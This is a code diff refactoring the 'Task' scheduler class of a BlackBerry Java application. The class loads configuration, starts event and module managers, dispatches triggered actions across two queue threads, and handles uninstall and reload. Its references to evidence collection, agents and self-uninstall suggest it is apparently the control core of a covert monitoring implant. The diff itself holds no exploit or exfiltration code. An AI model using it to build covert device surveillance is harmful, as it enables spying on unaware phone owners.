@@ -14,25 +14,24 @@ import java.util.Timer;
 import java.util.Vector;
 
 import net.rim.device.api.system.CodeModuleManager;
-import net.rim.device.api.system.RuntimeStore;
 import blackberry.action.Action;
 import blackberry.action.SubAction;
 import blackberry.action.UninstallAction;
-import blackberry.agent.Agent;
-import blackberry.config.Conf;
+import blackberry.config.ConfLoader;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.event.Event;
 import blackberry.evidence.EvidenceCollector;
-import blackberry.interfaces.Singleton;
-import blackberry.interfaces.UserAgent;
-import blackberry.utils.Utils;
+import blackberry.interfaces.iSingleton;
+import blackberry.manager.ActionManager;
+import blackberry.manager.EventManager;
+import blackberry.manager.ModuleManager;
+import blackberry.utils.BlockingQueueTrigger;
 
 /**
  * The Class Task.
  */
-public final class Task implements Singleton {
+public final class Task implements iSingleton {
 
     private static final int SLEEPING_TIME = 1000;
     private static final long APP_TIMER_PERIOD = 1000;
@@ -40,7 +39,7 @@ public final class Task implements Singleton {
 
     /** The debug instance. */
     //#ifdef DEBUG
-    private static Debug debug = new Debug("Task", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("Task", DebugLevel.INFORMATION);
 
     //#endif
 
@@ -51,10 +50,10 @@ public final class Task implements Singleton {
      */
     public static synchronized Task getInstance() {
         if (instance == null) {
-            instance = (Task) RuntimeStore.getRuntimeStore().get(GUID);
+            instance = (Task) Singleton.self().get(GUID);
             if (instance == null) {
                 final Task singleton = new Task();
-                RuntimeStore.getRuntimeStore().put(GUID, singleton);
+                Singleton.self().put(GUID, singleton);
                 instance = singleton;
             }
 
@@ -63,7 +62,7 @@ public final class Task implements Singleton {
     }
 
     /** The conf. */
-    Conf conf;
+    ConfLoader conf;
 
     /** The status. */
     Status status;
@@ -78,7 +77,7 @@ public final class Task implements Singleton {
     EventManager eventManager;
 
     /** The agent manager. */
-    AgentManager agentManager;
+    ModuleManager agentManager;
     Timer applicationTimer;
 
     // ApplicationUpdateTask();
@@ -96,11 +95,10 @@ public final class Task implements Singleton {
         logCollector = EvidenceCollector.getInstance();
 
         eventManager = EventManager.getInstance();
-        agentManager = AgentManager.getInstance();
+        agentManager = ModuleManager.getInstance();
 
         //#ifdef DEBUG
         debug.trace("Task created");
-
         //#endif
     }
 
@@ -108,77 +106,192 @@ public final class Task implements Singleton {
     Date lastActionCheckedEnd;
     String lastAction;
     String lastSubAction;
+    private CheckActionFast checkActionFast;
+    private Thread fastQueueThread;
 
     //Thread actionThread;
 
     /**
-     * Check actions.
+     * Task init.
      * 
      * @return true, if successful
      */
-    public boolean checkActions() {
+    public boolean taskInit() {
 
+        //#ifdef DEBUG
+        debug.trace("TaskInit");
+        //#endif
+
+        try {
+            if (conf != null) {
+                conf = null;
+            }
+
+            conf = new ConfLoader();
+
+            if (conf.loadConf() == false) {
+                //#ifdef DEBUG
+                debug.trace("Load Conf FAILED");
+                //#endif
+
+                return false;
+            } else {
+                //#ifdef DEBUG
+                debug.trace("taskInit: Load Conf Succeded");
+                //#endif
+            }
+
+            if (logCollector != null) {
+                //#ifdef DEBUG
+                debug.info("taskInit evidences");
+                //#endif
+                logCollector.initEvidences();
+            }
+
+            // Da qui in poi inizia la concorrenza dei thread
+
+            //#ifdef DEBUG
+            debug.trace("taskInit START ALL EVENTS");
+            //#endif
+            if (eventManager.startAll() == false) {
+                //#ifdef DEBUG
+                debug.trace("eventManager FAILED");
+                //#endif
+                return false;
+            }
+
+            //#ifdef DEBUG
+            debug.info("Events started");
+            //#endif
+            return true;
+        } catch (final GeneralException e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            debug.error("taskInit");
+            //#endif
+
+        } catch (final Exception e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            debug.error("taskInit");
+            //#endif
+        }
+        return false;
+
+    }
+
+    /**
+     * Check actions.
+     * 
+     * @return true, if reloading; false, if exit
+     */
+    public boolean checkActions() {
+        //#ifdef DEBUG
+        debug.trace("checkActions, start both");
+        //#endif
+
+        checkActionFast = new CheckActionFast(status.getTriggeredQueueFast());
+
+        fastQueueThread = new Thread(checkActionFast);
+        fastQueueThread.start();
+
+        boolean exit = checkActions(status.getTriggeredQueueMain());
+        //#ifdef DEBUG
+        debug.trace("checkActions, main finished, stopping fast.");
+        //#endif
+
+        checkActionFast.close();
+
+        try {
+            fastQueueThread.join();
+            checkActionFast = null;
+
+            //#ifdef DEBUG
+            debug.trace("checkActions, fast stopped.");
+            //#endif
+        } catch (InterruptedException e) {
+            //#ifdef DEBUG            
+            debug.error(e);
+            debug.error("checkActions");
+            //#endif
+        }
+
+        return exit;
+    }
+
+    class CheckActionFast implements Runnable {
+
+        private final BlockingQueueTrigger queue;
+
+        CheckActionFast(BlockingQueueTrigger queue) {
+            this.queue = queue;
+        }
+
+        public void close() {
+            queue.close();
+        }
+
+        public void run() {
+            boolean ret = checkActions(queue);
+        }
+    }
+
+    public boolean checkActions(BlockingQueueTrigger queue) {
         try {
             for (;;) {
 
                 lastActionCheckedStart = new Date();
 
                 //#ifdef DEBUG
-                debug.trace("checkActions");
+                debug.trace("checkActions: " + queue);
                 //#endif
 
-                if (needToRestart) {
+                final Trigger trigger = queue.getTriggeredAction();
+                if (trigger == null) {
                     //#ifdef DEBUG
-                    debug.info("checkActions, needToRestart");
+                    debug.trace("checkActions, null trigger: " + queue);
                     //#endif
-                    needToRestart = false;
+                    // queue interrupted
                     return false;
                 }
 
-                final int[] actionIds = status.getTriggeredActions();
-                
-                //#ifdef DEMO
-                Debug.playSound();
-                //#endif
-
-                final int asize = actionIds.length;
-                if (asize > 0) {
-
-                    for (int k = 0; k < asize; ++k) {
-                        final int actionId = actionIds[k];
-
-                        final Action action = status.getAction(actionId);
-                        lastAction = action.toString();
-
-                        //#ifdef DEBUG
-                        debug.trace("checkActions executing action: "
-                                + actionId);
-                        //#endif
-                        int exitValue = executeAction(action);
-
-                        if (exitValue == 1) {
-                            //#ifdef DEBUG
-                            debug.info("checkActions: Uninstall");
-                            //#endif
-
-                            UninstallAction.actualExecute();
-                            return false;
-                        } else if (exitValue == 2) {
-                            //#ifdef DEBUG
-                            debug.trace("checkActions: want Reload");
-                            //#endif
-                            return true;
-                        } else {
-                            //#ifdef DEBUG
-                            debug.trace("checkActions finished executing action: "
-                                    + actionId);
-                            //#endif
-                        }
-                    }
+                if (Status.self().isDemo()) {
+                    Debug.playSound();
                 }
+
+                String actionId = trigger.getId();
+                final Action action = (Action) ActionManager.getInstance().get(
+                        actionId);
+                lastAction = action.toString();
+
+                //#ifdef DEBUG
+                debug.trace("checkActions " + queue + " executing action: "
+                        + actionId);
+                //#endif
+                int exitValue = executeAction(action, trigger);
+
+                if (exitValue == Exit.UNINSTALL) {
+                    //#ifdef DEBUG
+                    debug.info("checkActions: Uninstall");
+                    //#endif
+
+                    UninstallAction.actualExecute();
+                    return false;
+                } else if (exitValue == Exit.RELOAD) {
+                    //#ifdef DEBUG
+                    debug.trace("checkActions: want Reload");
+                    //#endif
+                    return true;
+                } else {
+                    //#ifdef DEBUG
+                    debug.trace("checkActions finished executing action: "
+                            + actionId);
+                    //#endif
+                }
+
                 lastActionCheckedEnd = new Date();
 
-                Utils.sleep(SLEEPING_TIME);
+                //Utils.sleep(SLEEPING_TIME);
             }
         } catch (final Throwable ex) {
             // catching trowable should break the debugger anc log the full stack trace
@@ -189,17 +302,17 @@ public final class Task implements Singleton {
         }
     }
 
-    private int executeAction(final Action action) {
+    private int executeAction(final Action action, Trigger trigger) {
         int exit = 0;
         //#ifdef DEBUG
         debug.trace("CheckActions() triggered: " + action);
         //#endif
 
-        status.unTriggerAction(action);
+        action.unTrigger();
         //action.setTriggered(false, null);
 
         status.synced = false;
-        final Vector subActions = action.getSubActionsList();
+        final Vector subActions = action.getSubActions();
         final int ssize = subActions.size();
 
         //#ifdef DEBUG
@@ -216,51 +329,42 @@ public final class Task implements Singleton {
 
                 lastSubAction = subAction.toString();
 
-                /*
-                 * final boolean ret = subAction.execute(action
-                 * .getTriggeringEvent());
-                 */
-
                 //#ifdef DEBUG
                 debug.info("CheckActions() executing subaction (" + (j + 1)
                         + "/" + ssize + ") : " + action);
                 //#endif
 
                 // no callingEvent
-                subAction.prepareExecute(null);
-                subAction.run();
+                final boolean ret = subAction.execute(trigger);
 
-                if (subAction.wantUninstall()) {
+                if (status.uninstall) {
                     //#ifdef DEBUG
                     debug.warn("CheckActions() uninstalling");
                     //#endif
 
-                    exit = 1;
+                    exit = Exit.UNINSTALL;
                     break;
                     //return false;
                 }
 
-                if (subAction.wantReload()) {
+                else if (status.reload) {
                     //#ifdef DEBUG
                     debug.warn("checkActions: reloading");
                     //#endif
-                    status.unTriggerAll();
-                    //#ifdef DEBUG
-                    debug.trace("checkActions: stopping agents");
-                    //#endif
-                    agentManager.stopAll();
-                    //#ifdef DEBUG
-                    debug.trace("checkActions: stopping events");
-                    //#endif
-                    eventManager.stopAll();
-                    Utils.sleep(2000);
-                    //#ifdef DEBUG
-                    debug.trace("checkActions: untrigger all");
-                    //#endif
-                    status.unTriggerAll();
+
                     //return true;
-                    exit = 2;
+                    exit = Exit.RELOAD;
+                    status.reload = false;
                     break;
+                }
+
+                if (ret == false) {
+                    //#ifdef DEBUG
+                    debug.trace("executeAction Warn: "
+                            + "CheckActions() error executing: " + subAction);
+                    //#endif
+
+                    continue;
                 }
 
             } catch (final Exception ex) {
@@ -273,10 +377,12 @@ public final class Task implements Singleton {
         return exit;
     }
 
-    private void stopAll() {
+    void stopAll() {
         agentManager.stopAll();
         eventManager.stopAll();
         status.unTriggerAll();
+
+        ActionManager.getInstance().clear();
     }
 
     /**
@@ -351,114 +457,11 @@ public final class Task implements Singleton {
         }
     }
 
-    /**
-     * Task init.
-     * 
-     * @return true, if successful
-     */
-    public boolean taskInit() {
-        //#ifdef DEBUG
-        debug.trace("TaskInit");
-        //#endif
-
-        agentManager.stopAll();
-        eventManager.stopAll();
-
-        if (device != null) {
-            try {
-                device.refreshData();
-            } catch (final Exception ex) {
-                //#ifdef DEBUG
-                debug.error(ex);
-                //#endif
-            }
-        }
-
-        conf = new Conf();
-
-        if (conf.load() == false) {
-            //#ifdef DEBUG
-            debug.trace("Load Conf FAILED");
-            //#endif
-
-            return false;
-        } else {
-            //#ifdef DEBUG
-            debug.trace("taskInit: Load Conf Succeded");
-            //#endif
-        }
-
-        //#ifdef DEBUG
-        debug.trace("----------");
-        debug.info("AGENTS");
-        Vector vector = status.getAgentsList();
-        for (int i = 0; i < vector.size(); i++) {
-            Agent agent = (Agent) vector.elementAt(i);
-            if (agent.isEnabled()) {
-                debug.info("    " + agent.toString());
-            }
-        }
-
-        debug.info("ACTIONS");
-        vector = status.getActionsList();
-        for (int i = 0; i < vector.size(); i++) {
-            Action action = (Action) vector.elementAt(i);
-            debug.info("    " + action.toString());
-            Vector subs = action.getSubActionsList();
-            for (int j = 0; j < subs.size(); j++) {
-                SubAction sub = (SubAction) subs.elementAt(j);
-                debug.info("        " + sub.toString());
-            }
-        }
-
-        debug.info("EVENTS");
-        vector = status.getEventsList();
-        for (int i = 0; i < vector.size(); i++) {
-            Event event = (Event) vector.elementAt(i);
-            if (event.isEnabled()) {
-                debug.info("    " + event.toString());
-            }
-        }
-        //#endif
-
-        if (logCollector != null) {
-            logCollector.initEvidences();
-        }
-
-        // Da qui in poi inizia la concorrenza dei thread
-
-        if (eventManager.startAll() == false) {
-            //#ifdef DEBUG
-            debug.trace("eventManager FAILED");
-            //#endif
-            return false;
-        }
-
-        //#ifdef DEBUG
-        debug.info("Events started");
-
-        //#endif
-
-        if (agentManager.startAll() == false) {
-            //#ifdef DEBUG
-            debug.trace("agentManager FAILED");
-            //#endif
-            return false;
-        }
-
-        //#ifdef DEBUG
-        debug.info("Agents started");
-
-        //#endif
-        return true;
-    }
-
     public void reset() {
         //#ifdef DEBUG
         debug.trace("reset");
         //#endif
         stopAll();
-        status.unTriggerAll();
 
         // http://supportforums.blackberry.com/t5/Java-Development/Programmatically-rebooting-the-device/m-p/42049?view=by_date_ascending
         CodeModuleManager.promptForResetIfRequired();
@@ -466,48 +469,19 @@ public final class Task implements Singleton {
 
     private boolean needToRestart;
 
-    public void restart() {
+    public boolean reloadConf() {
         //#ifdef DEBUG
-        debug.trace("restart");
+        debug.trace("reloadConf: START");
         //#endif
+
         stopAll();
-        status.unTriggerAll();
-        needToRestart = true;
+
+        boolean ret = taskInit();
+        //#ifdef DEBUG
+        debug.trace("reloadConf: END");
+        //#endif
+        return ret;
+
     }
 
-    public void resumeUserAgents() {
-        //#ifdef DEBUG
-        debug.trace("resumeUserAgents");
-        //#endif
-        Vector vector = status.getAgentsList();
-        for (int i = 0; i < vector.size(); i++) {
-            Agent agent = (Agent) vector.elementAt(i);
-            if (agent instanceof UserAgent) {
-                if (agent.isEnabled() && !agent.isRunning()) {
-                    //#ifdef DEBUG
-                    debug.trace("resumeUserAgents: " + agent);
-                    //#endif
-                    agentManager.start(agent.agentId);
-                }
-            }
-        }
-    }
-
-    public void suspendUserAgents() {
-        //#ifdef DEBUG
-        debug.trace("suspendUserAgents");
-        //#endif
-        Vector vector = status.getAgentsList();
-        for (int i = 0; i < vector.size(); i++) {
-            Agent agent = (Agent) vector.elementAt(i);
-            if (agent instanceof UserAgent) {
-                if (agent.isEnabled() && agent.isRunning()) {
-                    //#ifdef DEBUG
-                    debug.trace("suspendUserAgents: " + agent);
-                    //#endif
-                    agentManager.stop(agent.agentId);
-                }
-            }
-        }
-    }
 }
